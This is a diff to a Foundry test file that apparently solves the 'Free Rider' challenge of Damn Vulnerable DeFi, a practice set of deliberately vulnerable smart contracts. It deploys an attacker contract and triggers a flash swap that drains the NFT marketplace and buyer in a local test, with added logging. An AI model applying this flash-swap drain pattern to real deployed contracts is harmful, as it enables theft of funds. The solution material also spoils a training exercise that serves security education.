@@ -5,6 +5,7 @@ import "forge-std/Test.sol";
 
 import {FreeRiderBuyer} from "../../../src/Contracts/free-rider/FreeRiderBuyer.sol";
 import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
+import {FreeRiderAttack} from "../../../src/Contracts/attacker-contracts/FreeRiderAttack.sol";
 import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
@@ -26,8 +27,10 @@ contract FreeRider is Test {
 
     FreeRiderBuyer internal freeRiderBuyer;
     FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
+    FreeRiderAttack internal freeRiderAttack;
     DamnValuableToken internal dvt;
     DamnValuableNFT internal damnValuableNFT;
+    DamnValuableNFT internal damnValuableNFT1;
     IUniswapV2Pair internal uniswapV2Pair;
     IUniswapV2Factory internal uniswapV2Factory;
     IUniswapV2Router02 internal uniswapV2Router;
@@ -144,12 +147,34 @@ contract FreeRider is Test {
 
         vm.stopPrank();
 
+        freeRiderAttack = new FreeRiderAttack(
+            payable(address(weth)),
+            address(dvt),
+            address(uniswapV2Factory),
+            payable(address(freeRiderNFTMarketplace)),
+            address(freeRiderBuyer),
+            address(damnValuableNFT)
+        );
+
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
+    }
+
+    function testNftReceive() public {
+        vm.startPrank(attacker);
+        damnValuableNFT1 = new DamnValuableNFT();
+        damnValuableNFT1.safeMint(attacker);
+        damnValuableNFT1.setApprovalForAll(address(freeRiderBuyer), true);
+        damnValuableNFT1.safeTransferFrom(attacker, address(freeRiderBuyer), 0);
+        vm.stopPrank();
     }
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
 
+        freeRiderAttack.flashSwap(address(weth), NFT_PRICE);
+
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
@@ -160,6 +185,8 @@ contract FreeRider is Test {
         // Attacker must have earned all ETH from the payout
         assertGt(attacker.balance, BUYER_PAYOUT);
         assertEq(address(freeRiderBuyer).balance, 0);
+
+        emit log_named_uint("Buyer Balance: ", address(freeRiderBuyer).balance);
 
         // The buyer extracts all NFTs from its associated contract
         vm.startPrank(buyer);
@@ -175,6 +202,11 @@ contract FreeRider is Test {
 
         // Exchange must have lost NFTs and ETH
         assertEq(freeRiderNFTMarketplace.amountOfOffers(), 0);
+        emit log_named_uint(
+            "Marketplace Offers: ",
+            freeRiderNFTMarketplace.amountOfOffers()
+        );
+
         assertLt(
             address(freeRiderNFTMarketplace).balance,
             MARKETPLACE_INITIAL_ETH_BALANCE
